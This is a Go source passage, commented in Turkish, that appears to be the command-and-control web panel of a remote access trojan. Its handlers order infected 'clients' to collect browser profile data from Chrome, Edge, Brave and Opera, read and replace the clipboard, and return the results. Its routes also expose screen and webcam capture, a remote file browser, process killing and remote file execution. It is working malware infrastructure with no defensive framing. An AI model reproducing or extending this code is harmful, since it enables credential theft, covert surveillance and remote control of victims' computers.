// POST /api/browser/collect { "id":"...", "browser":"Chrome"|"Edge"|"Brave"|"Opera"|"OperaGX" }
//
// Her zaman JSON döner:
//   Başarı: { "ok": true,  "name": "<zip_adi>", "data": "<base64_zip>" }
//   Hata:   { "ok": false, "error": "<mesaj>" }
//
// Frontend bu JSON'u parse edip base64'ü blob'a çevirerek indirir.
// Böylece Content-Type karışıklığından kaynaklanan JSON parse hatası olmaz.
func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID      string `json:"id"`
		Browser string `json:"browser"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}

	// Durumu sıfırla
	client.mu.Lock()
	client.BrowserReady    = false
	client.BrowserZipBytes = nil
	client.BrowserZipName  = ""
	client.BrowserErrMsg   = ""
	client.mu.Unlock()

	// Komutu gönder
	cmd := fmt.Sprintf("[browser_collect]%s", req.Browser)
	if err := sendCommandByID(req.ID, cmd); err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(500)
		json.NewEncoder(w).Encode(map[string]interface{}{"ok": false, "error": err.Error()})
		return
	}

	// Browser extraction uzun sürebilir (debug + profil çıkarma): 3 dakika bekle
	deadline := time.Now().Add(3 * time.Minute)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready    := client.BrowserReady
		errMsg   := client.BrowserErrMsg
		zipName  := client.BrowserZipName
		zipBytes := client.BrowserZipBytes
		client.mu.Unlock()

		if ready {
			w.Header().Set("Content-Type", "application/json")
			if errMsg != "" {
				// Hata durumu — JSON olarak döndür
				w.WriteHeader(500)
				json.NewEncoder(w).Encode(map[string]interface{}{
					"ok":    false,
					"error": errMsg,
				})
				return
			}
			// Başarı — zip'i base64 olarak JSON içinde döndür
			// Frontend blob oluşturup otomatik indirir
			b64 := base64.StdEncoding.EncodeToString(zipBytes)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"ok":   true,
				"name": zipName,
				"data": b64,
			})
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(504)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":    false,
		"error": "timeout: browser extraction tamamlanamadı",
	})
}

// ─── Clipboard Manager ────────────────────────────────────
// POST /api/clipboard/get  { "id":"..." }
func apiClipboardGetHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID string `json:"id"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}

	client.mu.Lock()
	client.ClipboardReady  = false
	client.ClipboardResult = ""
	client.mu.Unlock()

	if err := sendCommandByID(req.ID, "[clipboard_get]"); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready := client.ClipboardReady
		data  := client.ClipboardResult
		client.mu.Unlock()
		if ready {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{"text": data})
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	http.Error(w, "timeout: client cevap vermedi", 504)
}

// POST /api/clipboard/set  { "id":"...", "text":"..." }
func apiClipboardSetHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID   string `json:"id"`
		Text string `json:"text"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Geçersiz istek", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}

	client.mu.Lock()
	client.ClipboardSetReady  = false
	client.ClipboardSetResult = ""
	client.mu.Unlock()

	// Satır sonlarını escape'le (tek satır protokolü)
	escaped := strings.ReplaceAll(req.Text, "\n", "\\n")
	escaped  = strings.ReplaceAll(escaped, "\r", "")
	cmd := fmt.Sprintf("[clipboard_set]%s", escaped)

	if err := sendCommandByID(req.ID, cmd); err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		client.mu.Lock()
		ready  := client.ClipboardSetReady
		result := client.ClipboardSetResult
		client.mu.Unlock()
		if ready {
			w.Header().Set("Content-Type", "application/json")
			success := result == "ok"
			msg := result
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success": success,
				"message": msg,
			})
			return
		}
		time.Sleep(100 * time.Millisecond)
	}
	http.Error(w, "timeout: client cevap vermedi", 504)
}

// ─── Settings ─────────────────────────────────────────────
func apiSettingsHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	if r.Method == http.MethodGet {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(config)
		return
	}
	if r.Method == http.MethodPost {
		var req Config
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", 400)
			return
		}

		if req.TCPPort != "" && req.TCPPort != config.TCPPort {
			if err := restartTCPServer(req.TCPPort); err != nil {
				http.Error(w, err.Error(), 500)
				return
			}
			config.TCPPort = req.TCPPort
		}

		if req.HTTPPort != "" {
			config.HTTPPort = req.HTTPPort
		}
		if req.Key != "" {
			config.Key = req.Key
		}
		if req.ScreenFPS > 0 {
			config.ScreenFPS = req.ScreenFPS
		}

		if err := saveConfig(); err != nil {
			http.Error(w, "config kaydedilemedi: "+err.Error(), 500)
			return
		}

		w.WriteHeader(200)
		return
	}
	http.Error(w, "method not allowed", 405)
}

func apiClientUpdateHandler(w http.ResponseWriter, r *http.Request) {
	if !isAuthenticated(r) {
		http.Error(w, "Unauthorized", 401)
		return
	}
	var req struct {
		ID       string `json:"id"`
		Nickname string `json:"nickname"`
		Note     string `json:"note"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", 400)
		return
	}
	client := getClientByID(req.ID)
	if client == nil {
		http.Error(w, "client bulunamadı", 404)
		return
	}

	client.mu.Lock()
	client.Nickname = req.Nickname
	client.Note = req.Note
	client.mu.Unlock()

	w.WriteHeader(200)
}

func logoutHandler(w http.ResponseWriter, r *http.Request) {
	http.SetCookie(w, &http.Cookie{
		Name:    "session",
		Value:   "",
		Path:    "/",
		Expires: time.Unix(0, 0),
		MaxAge:  -1,
	})
	http.Redirect(w, r, "/login", http.StatusFound)
}

// ─── Main ─────────────────────────────────────────────────
func main() {
	loadConfig()

	go startTCPServer()

	http.Handle("/css/", http.StripPrefix("/css/", http.FileServer(http.Dir("css"))))

	http.HandleFunc("/", indexHandler)
	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			loginPostHandler(w, r)
		} else {
			loginGetHandler(w, r)
		}
	})
	http.HandleFunc("/dashboard", dashboardHandler)
	http.HandleFunc("/api/clients", apiClientsHandler)
	http.HandleFunc("/api/send", apiSendHandler)
	http.HandleFunc("/api/broadcast", apiBroadcastHandler)
	http.HandleFunc("/api/output", apiOutputHandler)
	http.HandleFunc("/api/stats", apiStatsHandler)
	http.HandleFunc("/api/screen", apiScreenHandler)
	http.HandleFunc("/api/screen/ctrl", apiScreenCtrlHandler)
	http.HandleFunc("/api/screen/status", apiScreenStatusHandler)
	http.HandleFunc("/api/cam", apiCamHandler)
	http.HandleFunc("/api/cam/ctrl", apiCamCtrlHandler)
	http.HandleFunc("/api/cam/status", apiCamStatusHandler)
	http.HandleFunc("/api/tasklist", apiTasklistHandler)
	http.HandleFunc("/api/taskkill", apiTaskkillHandler)
	http.HandleFunc("/api/fb/ls", apiFBLsHandler)
	http.HandleFunc("/api/fb/download", apiFBDownloadHandler)
	http.HandleFunc("/api/fb/delete", apiFBDeleteHandler)
	http.HandleFunc("/api/fb/mkdir", apiFBMkdirHandler)
	http.HandleFunc("/api/fb/upload", apiFBUploadHandler)
	http.HandleFunc("/api/fb/rename", apiFBRenameHandler)
	http.HandleFunc("/api/rfe", apiRFEHandler)
	http.HandleFunc("/api/browser/collect", apiBrowserCollectHandler)
	http.HandleFunc("/api/clipboard/get", apiClipboardGetHandler)
	http.HandleFunc("/api/clipboard/set", apiClipboardSetHandler)
	http.HandleFunc("/api/settings", apiSettingsHandler)
	http.HandleFunc("/api/client/update", apiClientUpdateHandler)
	http.HandleFunc("/logout", logoutHandler)

	fmt.Printf("HTTP server başlatıldı → http://localhost:%s\n", config.HTTPPort)
	log.Fatal(http.ListenAndServe(":"+config.HTTPPort, nil))
}